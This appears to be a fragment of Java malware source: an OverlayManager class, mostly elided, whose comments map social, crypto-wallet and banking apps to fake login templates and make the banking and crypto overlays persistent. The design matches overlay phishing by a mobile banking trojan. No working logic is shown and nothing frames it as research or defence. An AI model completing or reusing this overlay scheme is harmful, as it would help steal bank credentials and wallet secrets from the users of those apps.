...
public class OverlayManager {
    ...
    private void initDefaultMappings() {
        // Social apps - use social_login template
        ...
        // Crypto apps - use crypto_wallet template
        ...
        // Finance/Banking apps - use bank_login template
        ...
        // Set persistence - banking and crypto apps should be persistent
